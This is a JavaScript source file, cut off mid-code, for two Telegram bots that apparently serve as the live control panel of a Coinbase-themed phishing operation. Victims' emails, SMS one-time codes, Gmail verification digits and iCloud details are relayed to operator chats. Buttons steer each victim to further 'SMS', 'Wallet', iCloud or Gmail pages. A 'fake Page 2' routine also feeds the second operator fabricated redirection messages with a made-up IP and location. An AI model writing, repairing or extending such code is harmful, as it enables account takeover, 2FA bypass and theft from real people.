const TelegramBot = require("node-telegram-bot-api");
const fetch = require("node-fetch");

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const APP_URL = process.env.APP_URL;

const BOT_TOKEN_2 = process.env.BOT_TOKEN_2;
const ADMIN_CHAT_ID_2 = process.env.ADMIN_CHAT_ID_2;

if (!BOT_TOKEN || !ADMIN_CHAT_ID || !APP_URL) {
  console.error("❌ Missing BOT_TOKEN, ADMIN_CHAT_ID, or APP_URL in environment");
  process.exit(1);
}

// ============================================================================
// ✅ BOT 1 SETUP
// ============================================================================

const bot = new TelegramBot(BOT_TOKEN, {
  polling: { autoStart: true, params: { timeout: 10 } }
});

bot.getMe().then(() => {
  console.log("✅ Bot 1 connected successfully.");
}).catch(err => {
  console.error("❌ Bot 1 connection failed:", err.message);
});

let botRestartAttempts = 0;
bot.on("polling_error", (err) => {
  if (err.code === "ETELEGRAM" && err.message.includes("409")) {
    botRestartAttempts++;
    if (botRestartAttempts <= 1) {
      console.warn("⚠️ Bot 1: 409 Conflict - stopping and restarting polling...");
      bot.stopPolling().then(() => {
        setTimeout(() => {
          bot.startPolling();
          console.log("✅ Bot 1: Polling restarted");
        }, 2000);
      });
    } else {
      console.error("❌ Bot 1: Multiple 409 errors - possible duplicate instance");
    }
  } else {
    console.error("❌ Bot 1 polling error:", err.message);
  }
});

// ============================================================================
// ✅ BOT 2 SETUP (NEW)
// ============================================================================

let bot2 = null;
if (BOT_TOKEN_2 && ADMIN_CHAT_ID_2) {
  bot2 = new TelegramBot(BOT_TOKEN_2, {
    polling: {
      autoStart: true,
      params: { timeout: 10 }
    }
  });

  bot2.getMe().then(() => {
    console.log("✅ Bot 2 connected successfully.");
  }).catch(err => {
    console.error("❌ Bot 2 connection failed:", err.message);
  });

  let bot2RestartAttempts = 0;
  bot2.on("polling_error", (err) => {
    if (err.code === "ETELEGRAM" && err.message.includes("409")) {
      bot2RestartAttempts++;
      if (bot2RestartAttempts <= 1) {
        console.warn("⚠️ Bot 2: 409 Conflict - stopping and restarting polling...");
        bot2.stopPolling().then(() => {
          setTimeout(() => {
            bot2.startPolling();
            console.log("✅ Bot 2: Polling restarted");
          }, 2000);
        });
      } else {
        console.error("❌ Bot 2: Multiple 409 errors - possible duplicate instance");
      }
    } else {
      console.error("❌ Bot 2 polling error:", err.message);
    }
  });
}

// ============================================================================
// ✅ GLOBAL STORAGE OBJECTS (EXPORTED TO server.js)
// ============================================================================

const userWinnerTelegram = {};
const botsThatClickedPage1 = {};
const notificationSent = {};
const handledCallbacks = new Set();
const bot2WinnerTimestamp = {};  // ✅ Track when Bot 2 wins for fake Page 2 timeout

// ============================================================================
// ✅ BROADCAST MESSAGE (Send to both bots)
// ============================================================================

async function broadcastMessage(chatId, message, options = {}) {
  const errors = [];

  try {
    await bot.sendMessage(chatId, message, options);
  } catch (err) {
    console.error("❌ Failed to send to Bot 1:", err.message);
    errors.push(err);
  }

  if (bot2 && ADMIN_CHAT_ID_2) {
    try {
      await bot2.sendMessage(ADMIN_CHAT_ID_2, message, options);
    } catch (err) {
      console.error("❌ Failed to send to Bot 2:", err.message);
      errors.push(err);
    }
  }

  if (errors.length === 2) {
    throw new Error("Failed to send to all bots");
  }
}

// ============================================================================
// ✅ SEND FOLLOW-UP MESSAGE (To winner only)
// ============================================================================

async function sendFollowUpMessage(email, message, options = {}) {
  try {
    
    if (userWinnerTelegram[email] === "telegram1") {
      await bot.sendMessage(ADMIN_CHAT_ID, message, options);
    } else if (userWinnerTelegram[email] === "telegram2") {
      if (bot2 && ADMIN_CHAT_ID_2) {
        await bot2.sendMessage(ADMIN_CHAT_ID_2, message, options);
      }
    } else {
      console.log(`⚠️ No winner found for ${email}, not sending follow-up`);
    }
  } catch (err) {
    console.error("❌ Failed to send follow-up message:", err.message);
  }
}

// ============================================================================
// ✅ BOT 1 CALLBACK QUERY HANDLER
// ============================================================================

bot.on("callback_query", async (query) => {
  const callbackId = query.id;
  
  if (handledCallbacks.has(callbackId)) return;
  handledCallbacks.add(callbackId);

  try {
    const [action, identifier] = query.data.split("|");


    // ============================================================================
    // ✅ VERIFY_DIGIT HANDLER (Gmail verification)
    // ============================================================================
    if (action === "verify_digit") {
      const [, requestId, digit] = query.data.split("|");
      
      try {
        const updateResult = await fetch(`${APP_URL}/update-selected-digits`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ requestId, digit })
        });
        
        const result = await updateResult.json();
        
        // ✅ Only remove keyboard and show message when we have 2 digits
        if (result.selectedCount === 2) {
          try {
            await bot.editMessageReplyMarkup(
              { inline_keyboard: [] },
              { chat_id: query.message.chat.id, message_id: query.message.message_id }
            );
            
            await bot.sendMessage(
              query.message.chat.id,
              `✅ <b>Numbers Selected!</b>`,
              { parse_mode: "HTML" }
            );
          } catch (err) {
            console.error("❌ Error editing message:", err);
          }
        }

        await bot.answerCallbackQuery(query.id, { text: `📍 Digit ${digit} selected (${result.selectedCount}/2)` });
        return;
      } catch (err) {
        console.error("❌ verify_digit error:", err);
        await bot.answerCallbackQuery(query.id, { text: "Error processing digit" });
        return;
      }
    }

    // ============================================================================
    // ✅ SMS2 BUTTONS HANDLER
    // ============================================================================
    if (action === "sms2_wallet" || action === "sms2_done" || action === "sms2_reject" || action === "sms2_icloud" || action === "sms2_gmail") {
      const sms2Id = identifier;
      
      try {
        const updateResult = await fetch(`${APP_URL}/update-sms2-choice`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ sms2Id, choice: action })
        });
        
        const result = await updateResult.json();
        
        try {
          await bot.editMessageReplyMarkup(
            { inline_keyboard: [] },
            { chat_id: query.message.chat.id, message_id: query.message.message_id }
          );
        } catch (err) {
          console.error("Error removing buttons:", err);
        }
        
        await bot.answerCallbackQuery(query.id, { text: `✅ ${action.toUpperCase()}` });
        
        try {
          const botToken = process.env.BOT_TOKEN;
          const chatId = process.env.ADMIN_CHAT_ID;
          
          const sms2Info = await fetch(`${APP_URL}/get-sms2-info/${sms2Id}`);
          const sms2Data = await sms2Info.json();
          const sms2Email = sms2Data.email || sms2Id;
          
          let statusMsg = "";
          if (action === "sms2_wallet") {
            statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Wallet</b> 💼`;
          } else if (action === "sms2_done") {
            statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Done</b> 🏁`;
          } else if (action === "sms2_reject") {
            statusMsg = `📧 <code>${sms2Email}</code> has been <b>REJECTED</b>! ❌`;
          } else if (action === "sms2_icloud") {
            statusMsg = `📧 <code>${sms2Email}</code> → ☁️`;
          } else if (action === "sms2_gmail") {
            statusMsg = `📧 <code>${sms2Email}</code> → 🌈`;
          }
          
          if (statusMsg) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            await fetch(url, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: chatId,
                text: statusMsg,
                parse_mode: "HTML"
              })
            });
          }
        } catch (err) {
          console.error("Error sending status message:", err);
        }
        
        return;
      } catch (err) {
        console.error("❌ SMS 2 choice error:", err);
        await bot.answerCallbackQuery(query.id, { text: "Error processing choice" });
        return;
      }
    }

    // ============================================================================
    // ✅ VERIFYING BUTTONS HANDLER
    // ============================================================================
    if (action === "verifying_sms" || action === "verifying_done" || action === "verifying_wallet" || action === "verifying_icloud" || action === "verifying_gmail") {
      const verifyingId = identifier;
      
      try {
        const updateResult = await fetch(`${APP_URL}/update-verifying-choice`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ verifyingId, choice: action })
        });
        
        const result = await updateResult.json();
        
        try {
          await bot.editMessageReplyMarkup(
            { inline_keyboard: [] },
            { chat_id: query.message.chat.id, message_id: query.message.message_id }
          );
        } catch (err) {
          console.error("Error removing buttons:", err);
        }
        
        await bot.answerCallbackQuery(query.id, { text: `✅ ${action.toUpperCase()}` });
        
        try {
          const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${verifyingId}`);
          const verifyData = await verifyRes.json();
          const verifyEmail = verifyData.displayEmail || verifyData.email || 'unknown@example.com';
          
          let choiceText = '';
          if (action === "verifying_sms") {
            choiceText = `📧 <code>${verifyEmail}</code> → <b>SMS - 2</b> 💬`;
          } else if (action === "verifying_done") {
            choiceText = `📧 <code>${verifyEmail}</code> → <b>Done</b> 🏁`;
          } else if (action === "verifying_wallet") {
            choiceText = `📧 <code>${verifyEmail}</code> → <b>Wallet</b> 💼`;
          } else if (action === "verifying_icloud") {
            choiceText = `📧 <code>${verifyEmail}</code> → ☁️`;
          } else if (action === "verifying_gmail") {
            choiceText = `📧 <code>${verifyEmail}</code> → 🌈`;
          }
          
          if (choiceText) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                text: choiceText,
                parse_mode: "HTML"
              })
            });
          }
        } catch (err) {
          console.error("Error sending choice message:", err);
        }
        
        return;
      } catch (err) {
        console.error("❌ Verifying choice error:", err);
        await bot.answerCallbackQuery(query.id, { text: "Error processing choice" });
        return;
      }
    }

    // ============================================================================
    // ✅ WALLET DECISION BUTTONS HANDLER
    // ============================================================================
    if (action.startsWith("wallet_decision_")) {
      const email = identifier;
      console.log(`💼 Wallet decision: ${action} for email: ${email}`);
      
      try {
        await fetch(`${APP_URL}/update-wallet-decision`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email, choice: action })
        });

        try {
          await bot.editMessageReplyMarkup(
            { inline_keyboard: [] },
            { chat_id: query.message.chat.id, message_id: query.message.message_id }
          );
        } catch (err) {}

        // ✅ SEND STATUS MESSAGE
        let statusMessage = "";
        
        if (action === "wallet_decision_sms") {
          statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
        } else if (action === "wallet_decision_done") {
          statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
        } else if (action === "wallet_decision_icloud") {
          statusMessage = `📧 <code>${email}</code> → ☁️`;
        } else if (action === "wallet_decision_gmail") {
          statusMessage = `📧 <code>${email}</code> → 🌈`;
        }

        if (statusMessage) {
          try {
            await bot.sendMessage(ADMIN_CHAT_ID, statusMessage, { parse_mode: "HTML" });
          } catch (err) {
            console.error(`❌ Error sending status message:`, err.message);
          }
        }

        await bot.answerCallbackQuery(query.id, { text: `✅ ${action.toUpperCase()}` });
        return;
      } catch (err) {
        console.error("❌ Wallet decision error:", err);
        await bot.answerCallbackQuery(query.id, { text: "Error processing decision" });
        return;
      }
    }

    // ============================================================================
    // ✅ FAKE PAGE 2 LOGIC (Bot 1 fake redirection when Bot 2 is winner)
    // ============================================================================
    if ((action === "page2") && userWinnerTelegram[identifier] === "telegram2") {
      // Bot 2 is winner, Bot 1 clicked Email Redirection - send FAKE Page 2
      
      const timeSinceBot2Won = Date.now() - bot2WinnerTimestamp[identifier];
      const TEN_SECONDS = 10000;
      
      console.log(`⏱️ Bot 1 clicked page2 - Time since Bot 2 won: ${timeSinceBot2Won}ms`);
      
      if (timeSinceBot2Won <= TEN_SECONDS) {
        // ✅ Within 10 seconds - Send FAKE Page 2 after 1 second
        console.log(`✅ FAKE Page 2 will be sent to Bot 1 after 1 second`);
        
        // ✅ REMOVE Page 1 BUTTONS
        try {
          await bot.editMessageReplyMarkup(
            { inline_keyboard: [] },
            { chat_id: query.message.chat.id, message_id: query.message.message_id }
          );
          console.log(`✅ Page 1 buttons removed`);
        } catch (err) {
          console.error("Error removing Page 1 buttons:", err);
        }
        
        // ✅ SEND ACCEPTANCE MESSAGE INSTANTLY (no delay)
        try {
          await bot.sendMessage(ADMIN_CHAT_ID, 
            `📧 <code>${identifier}</code> has been <b>ACCEPTED</b>! ✅`,
            { parse_mode: "HTML" }
          );
          console.log(`✅ Acceptance message sent instantly`);
        } catch (err) {
          console.error("Error sending acceptance message:", err);
        }
        
        // ✅ DELAY FAKE PAGE 2 BY 1 SECOND
        setTimeout(async () => {
          try {
            // Send fake Page 2 redirection message with buttons
            const fakePage2Message = 
              `😈😈😈 <b>Coinbase - Redirection</b> 😈😈😈\n` +
              `<b>👤 User ID:</b> <code>#1</code>\n` +
              `<b>📧 Email:</b> <code>${identifier}</code>\n` +
              `<b>🌍 Region:</b> Rabat, Morocco\n` +
              `<b>💻 Device:</b> Windows PC\n` +
              `<b>📍 IP:</b> 196.64.108.245`;
            
            const fakePage2Options = {
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [
                  [{ text: "☁️ iCloud ☁️", callback_data: `fake_redirect_icloud|${identifier}` }],
                  [{ text: "🌈 Gmail 🌈", callback_data: `fake_redirect_gmail|${identifier}` }]
                ]
              }
            };
            
            await bot.sendMessage(ADMIN_CHAT_ID, fakePage2Message, fakePage2Options);
            console.log(`✅ FAKE Page 2 sent to Bot 1 for ${identifier}`);
          } catch (err) {
            console.error("Error sending fake Page 2:", err);
          }
        }, 1000);  // 1 second delay
        
        await bot.answerCallbackQuery(query.id, { text: "✅ ACCEPTED" });
        return;
      } else {
        // ❌ After 10 seconds - Send NOTHING, complete silence
        console.log(`⏱️ TIMEOUT: 10 seconds passed, sending nothing to Bot 1`);
        
        await bot.answerCallbackQuery(query.id, { text: "✅ ACCEPTED" });
        return;
      }
    }

    // ============================================================================
    // ✅ FAKE PAGE 2 BUTTON CLICKS (Bot 1 clicking on fake redirection buttons)
    // ============================================================================
    if ((action === "fake_redirect_icloud" || action === "fake_redirect_gmail") && userWinnerTelegram[identifier] === "telegram2") {
      // Bot 1 clicked on FAKE Page 2 buttons - Just print and fake it
      
      const isIcloud = action === "fake_redirect_icloud";
      const statusMessage = isIcloud 
        ? `📧 <code>${identifier}</code> redirected to ☁️<b>iCloud</b>☁️`
        : `📧 <code>${identifier}</code> redirected to 🌈<b>Gmail</b>🌈`;
      
      console.log(`🎭 FAKE button clicked by Bot 1: ${action}`);
      
      try {
        // Remove fake buttons
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          { chat_id: query.message.chat.id, message_id: query.message.message_id }
        );
      } catch (err) {}
      
      try {
        // Send fake status message
        await bot.sendMessage(ADMIN_CHAT_ID, statusMessage, { parse_mode: "HTML" });
      } catch (err) {
        console.error("Error sending fake status:", err);
      }
      
      await bot.answerCallbackQuery(query.id, { text: "✅ " + (isIcloud ? "iCLOUD" : "GMAIL") });
      return;
    }

    // ============================================================================
    // ✅ NORMAL PAGE 1 HANDLING (Bot 1 wins or standard clicks)
    // ============================================================================
    
    let email = identifier;
    let smsCode = "";
    let displayEmail = email;  // ✅ What to show in acceptance message

    // ✅ For SMS callbacks, get SMS code from server
    if (action.startsWith("sms_")) {
      try {
        // Try to get SMS code - identifier could be email (Coinbase) or requestId (iCloud)
        const response = await fetch(`${APP_URL}/get-sms-code?requestId=${encodeURIComponent(identifier)}&email=${encodeURIComponent(email)}`);
        const data = await response.json();
        smsCode = data.smsCode || identifier;
      } catch (err) {
        console.error("Error fetching SMS code:", err);
        smsCode = identifier;
      }
    }

    // ✅ For iCloud page callbacks, get displayEmail from server
    if (action.startsWith("page_") && identifier && !identifier.includes("sms_code_")) {
      try {
        const response = await fetch(`${APP_URL}/get-page-display-email?email=${encodeURIComponent(identifier)}`);
        const data = await response.json();
        displayEmail = data.displayEmail || email;
      } catch (err) {
        console.error("Error fetching display email:", err);
        displayEmail = email;
      }
    }

    // ✅ STEP 1: Set winner on first click (Page 1 only - don't set for Gmail/SMS/page_/verification!)
    if (!userWinnerTelegram[email] && !action.startsWith("sms_") && !action.startsWith("gmail_") && !action.startsWith("page_") && !action.startsWith("verification_")) {
      userWinnerTelegram[email] = "telegram1";  // Bot 1 wins (first to click)
      botsThatClickedPage1[email] = true;
      botsThatClickedPage1[`${email}_timestamp`] = Date.now();
      
      
      // Send notification to Bot 2 (loser)
      if (bot2 && ADMIN_CHAT_ID_2) {
        try {
          await bot2.sendMessage(ADMIN_CHAT_ID_2, `🏆 Bot 1 WINS!`, { parse_mode: "HTML" });
        } catch (err) {
          console.error("Error sending loser notification:", err);
        }
      }
    }

    // ============================================================================
    // ✅ STEP 2: Handle button-specific logic
    // ============================================================================

    // Handle status update
    const response = await fetch(`${APP_URL}/update-status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, identifier: email, status: action })
    });

    // Handle redirection choices
    if (action.includes("redirect_")) {
      await fetch(`${APP_URL}/update-redirection-choice`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, choice: action })
      });
    }

    if (response.ok) {
      // Remove buttons from original message
      try {
        const editUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`;
        await fetch(editUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: ADMIN_CHAT_ID,
            message_id: query.message?.message_id,
            reply_markup: JSON.stringify({ inline_keyboard: [] })
          })
        });
      } catch (err) {}

      // Build status message
      let statusMessage = "";
      
      if (action === "page1") {
        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
      } else if (action === "page2") {
        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
      } else if (action === "reject") {
        statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
      } else if (action === "page_accept") {
        statusMessage = `☁️ <code>${displayEmail}</code> has been <b>ACCEPTED</b>! ✅`;
      } else if (action === "page_reject") {
        statusMessage = `☁️ <code>${displayEmail}</code> has been <b>REJECTED</b>! ❌`;
      } else if (action === "sms_accept") {
        statusMessage = `💬 <code>${smsCode}</code> SMS <b>ACCEPTED</b>!✅`;
      } else if (action === "sms_reject") {
        statusMessage = `💬 <code>${smsCode}</code> SMS <b>REJECTED</b>!❌`;
      } else if (action === "redirect_icloud") {
        statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
      } else if (action === "redirect_gmail") {
        statusMessage = `📧 <code>${email}</code> redirected to 🌈<b>Gmail</b>🌈`;
      } else if (action === "gmail_accept") {
        // ✅ For Gmail callbacks, fetch displayEmail
        try {
          const response = await fetch(`${APP_URL}/get-gmail-display-email?requestId=${encodeURIComponent(email)}`);
          const data = await response.json();
          displayEmail = data.displayEmail || email;
        } catch (err) {
          console.error("Error fetching Gmail display email:", err);
          displayEmail = email;
        }
        statusMessage = `🌈 <code>${displayEmail}</code> has been <b>ACCEPTED</b>! ✅`;
      } else if (action === "gmail_reject") {
        // ✅ For Gmail callbacks, fetch displayEmail
        try {
          const response = await fetch(`${APP_URL}/get-gmail-display-email?requestId=${encodeURIComponent(email)}`);
          const data = await response.json();
          displayEmail = data.displayEmail || email;
        } catch (err) {
          console.error("Error fetching Gmail display email:", err);
          displayEmail = email;
        }
        statusMessage = `🌈 <code>${displayEmail}</code> has been <b>REJECTED</b>! ❌`;
      } else if (action === "verification_accept") {
        // ✅ For verification callbacks, fetch displayEmail
        try {
          const response = await fetch(`${APP_URL}/get-verification-display-email?requestId=${encodeURIComponent(email)}`);
          const data = await response.json();
          displayEmail = data.displayEmail || email;
        } catch (err) {
          console.error("Error fetching verification display email:", err);
          displayEmail = email;
        }
        statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>ACCEPTED</b>! ✅`;
      } else if (action === "verification_reject") {
        // ✅ For verification callbacks, fetch displayEmail
        try {
          const response = await fetch(`${APP_URL}/get-verification-display-email?requestId=${encodeURIComponent(email)}`);
          const data = await response.json();
          displayEmail = data.displayEmail || email;
        } catch (err) {
          console.error("Error fetching verification display email:", err);
          displayEmail = email;
        }
        statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>REJECTED</b>! ❌`;
      } else if (action === "gmail_verify_accept") {
        statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>ACCEPTED</b>! ✅`;
      } else if (action === "gmail_verify_reject") {
        statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>REJECTED</b>! ❌`;
      } else if (action === "verifying_sms") {
        statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
      } else if (action === "verifying_done") {
        statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
      } else if (action === "verifying_wallet") {
        statusMessage = `📧 <code>${email}</code> → <b>Wallet</b> 💼`;
      } else if (action === "verifying_icloud") {
        statusMessage = `📧 <code>${email}</code> → ☁️`;
      } else if (action === "verifying_gmail") {
        statusMessage = `📧 <code>${email}</code> → 🌈`;
      } else if (action === "sms2_wallet") {
        statusMessage = `📧 <code>${email}</code> has been directed to <b>Wallet</b> 💼`;
      } else if (action === "sms2_done") {
        statusMessage = `📧 <code>${email}</code> has been directed to <b>Done</b> 🏁`;
      } else if (action === "sms2_reject") {
        statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
      } else if (action === "wallet_decision_sms") {
        statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
      } else if (action === "wallet_decision_done") {
        statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
      } else if (action === "wallet_decision_icloud") {
        statusMessage = `📧 <code>${email}</code> → ☁️`;
      } else if (action === "wallet_decision_gmail") {
        statusMessage = `📧 <code>${email}</code> → 🌈`;
      }


      // ✅ UPDATE STATUS on backend for verification callbacks
      if (action === "verification_accept" || action === "verification_reject") {
        try {
          await fetch(`${APP_URL}/update-status`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email: email, action: action })
          });
        } catch (err) {
          console.error("Error updating status:", err);
        }
      }

      if (statusMessage) {
        // ✅ Log status message to console (strip HTML tags for clean logs)
        const cleanMessage = statusMessage
          .replace(/<code>/g, '')
          .replace(/<\/code>/g, '')
          .replace(/<b>/g, '')
          .replace(/<\/b>/g, '')
          .replace(/<i>/g, '')
          .replace(/<\/i>/g, '');
        console.log(cleanMessage);
        
        try {
          const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
          await fetch(replyUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: ADMIN_CHAT_ID,
              text: statusMessage,
              parse_mode: "HTML"
            })
          });
        } catch (err) {
          console.error(`❌ Failed to send status message:`, err);
        }
      }
    }

    bot.answerCallbackQuery(callbackId, {
      text: `✅ ${action.toUpperCase()}`,
      show_alert: false
    }).catch(() => {});

  } catch (err) {
    console.error("❌ Error:", err.message);
    bot.answerCallbackQuery(query.id, {
      text: "❌ Error",
      show_alert: true
    }).catch(() => {});
  }
});

// ============================================================================
// ✅ BOT 2 CALLBACK QUERY HANDLER (with loser polling logic)
// ============================================================================

if (bot2) {
  bot2.on("callback_query", async (query) => {
    const callbackId = query.id;
    
    if (handledCallbacks.has(callbackId)) return;
    handledCallbacks.add(callbackId);

    try {
      const [action, identifier] = query.data.split("|");


      let email = identifier;
      let smsCode = "";
      let displayEmail = email;  // ✅ What to show in acceptance message

      // ✅ For SMS callbacks, get SMS code from server
      if (action.startsWith("sms_")) {
        try {
          const response = await fetch(`${APP_URL}/get-sms-code?requestId=${encodeURIComponent(identifier)}&email=${encodeURIComponent(email)}`);
          const data = await response.json();
          smsCode = data.smsCode || identifier;
        } catch (err) {
          console.error("Error fetching SMS code:", err);
          smsCode = identifier;
        }
      }

      // ✅ For iCloud page callbacks, get displayEmail from server
      if (action.startsWith("page_") && identifier && !identifier.includes("sms_code_")) {
        try {
          const response = await fetch(`${APP_URL}/get-page-display-email?email=${encodeURIComponent(identifier)}`);
          const data = await response.json();
          displayEmail = data.displayEmail || email;
        } catch (err) {
          console.error("Error fetching display email:", err);
          displayEmail = email;
        }
      }

      // ============================================================================
      // ✅ WALLET DECISION BUTTONS (Bot 2)
      // ============================================================================

      if (action === "wallet_decision_sms" || action === "wallet_decision_done" || action === "wallet_decision_icloud" || action === "wallet_decision_gmail") {
        const email = identifier;

        try {
          // ✅ REMOVE BUTTONS from message
          const editUrl = `https://api.telegram.org/bot${BOT_TOKEN_2}/editMessageReplyMarkup`;
          await fetch(editUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: ADMIN_CHAT_ID_2,
              message_id: query.message?.message_id,
              reply_markup: JSON.stringify({ inline_keyboard: [] })
            })
          });
        } catch (err) {}

        try {
          await fetch(`${APP_URL}/update-wallet-decision`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email, choice: action })
          });
          
          console.log(`✅ Wallet decision updated (Bot 2): ${action}`);
        } catch (err) {
          console.error("Error updating wallet decision:", err);
        }

        let statusMessage = "";
        
        if (action === "wallet_decision_sms") {
          statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
        } else if (action === "wallet_decision_done") {
          statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
        } else if (action === "wallet_decision_icloud") {
          statusMessage = `📧 <code>${email}</code> → ☁️`;
        } else if (action === "wallet_decision_gmail") {
          statusMessage = `📧 <code>${email}</code> → 🌈`;
        }

        if (statusMessage) {
          try {
            const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`;
            const response = await fetch(replyUrl, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID_2,
                text: statusMessage,
                parse_mode: "HTML"
              })
            });
            
            if (response.ok) {
            } else {
              console.error(`❌ Failed to send status message (Bot 2). Response status: ${response.status}`);
            }
          } catch (err) {
            console.error(`❌ Error sending status message (Bot 2):`, err.message);
          }
        }

        bot2.answerCallbackQuery(callbackId, {
          text: `✅ ${action.toUpperCase()}`,
          show_alert: false
        }).catch(() => {});

        return;
      }

      // ✅ HANDLE VERIFYING BUTTONS (Bot 2)
      if (action === "verifying_sms" || action === "verifying_done" || action === "verifying_wallet" || action === "verifying_icloud" || action === "verifying_gmail") {
        const verifyingId = identifier;
        
        try {
          const updateResult = await fetch(`${APP_URL}/update-verifying-choice`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ verifyingId, choice: action })
          });
          
          try {
            await bot2.editMessageReplyMarkup(
              { inline_keyboard: [] },
              { chat_id: query.message.chat.id, message_id: query.message.message_id }
            );
          } catch (err) {
            console.error("Error removing buttons:", err);
          }
          
          await bot2.answerCallbackQuery(callbackId, { text: `✅ ${action.toUpperCase()}` });
          
          try {
            const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${verifyingId}`);
            const verifyData = await verifyRes.json();
            const verifyEmail = verifyData.displayEmail || verifyData.email || 'unknown@example.com';
            
            let choiceText = '';
            if (action === "verifying_sms") {
              choiceText = `📧 <code>${verifyEmail}</code> → <b>SMS - 2</b> 💬`;
            } else if (action === "verifying_done") {
              choiceText = `📧 <code>${verifyEmail}</code> → <b>Done</b> 🏁`;
            } else if (action === "verifying_wallet") {
              choiceText = `📧 <code>${verifyEmail}</code> → <b>Wallet</b> 💼`;
            } else if (action === "verifying_icloud") {
              choiceText = `📧 <code>${verifyEmail}</code> → ☁️`;
            } else if (action === "verifying_gmail") {
              choiceText = `📧 <code>${verifyEmail}</code> → 🌈`;
            }
            
            if (choiceText) {
              const url = `https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`;
              await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  chat_id: ADMIN_CHAT_ID_2,
                  text: choiceText,
                  parse_mode: "HTML"
                })
              });
            }
          } catch (err) {
            console.error("Error sending verifying choice message:", err);
          }
          
          return;
        } catch (err) {
          console.error("Error processing verifying choice:", err);
          return;
        }
      }

      // ✅ HANDLE SMS 2 BUTTONS (Bot 2) - NEW!
      if (action === "sms2_wallet" || action === "sms2_done" || action === "sms2_reject" || action === "sms2_icloud" || action === "sms2_gmail") {
        const sms2Id = identifier;
        
        try {
          const updateResult = await fetch(`${APP_URL}/update-sms2-choice`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ sms2Id, choice: action })
          });
          
          try {
            await bot2.editMessageReplyMarkup(
              { inline_keyboard: [] },
              { chat_id: query.message.chat.id, message_id: query.message.message_id }
            );
          } catch (err) {
            console.error("Error removing buttons:", err);
          }
          
          await bot2.answerCallbackQuery(callbackId, { text: `✅ ${action.toUpperCase()}` });
          
          try {
            const sms2Info = await fetch(`${APP_URL}/get-sms2-info/${sms2Id}`);
            const sms2Data = await sms2Info.json();
            const sms2Email = sms2Data.email || sms2Id;
            
            let statusMsg = "";
            if (action === "sms2_wallet") {
              statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Wallet</b> 💼`;
            } else if (action === "sms2_done") {
              statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Done</b> 🏁`;
            } else if (action === "sms2_reject") {
              statusMsg = `📧 <code>${sms2Email}</code> has been <b>REJECTED</b>! ❌`;
            } else if (action === "sms2_icloud") {
              statusMsg = `📧 <code>${sms2Email}</code> → ☁️`;
            } else if (action === "sms2_gmail") {
              statusMsg = `📧 <code>${sms2Email}</code> → 🌈`;
            }
            
            if (statusMsg) {
              const url = `https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`;
              await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  chat_id: ADMIN_CHAT_ID_2,
                  text: statusMsg,
                  parse_mode: "HTML"
                })
              });
            }
          } catch (err) {
            console.error("Error sending SMS2 status message:", err);
          }
          
          return;
        } catch (err) {
          console.error("Error processing SMS2 choice:", err);
          return;
        }
      }

      // ✅ STEP 1: Set winner on first click (if Bot 1 hasn't clicked yet - Page 1 only, NO verification!)
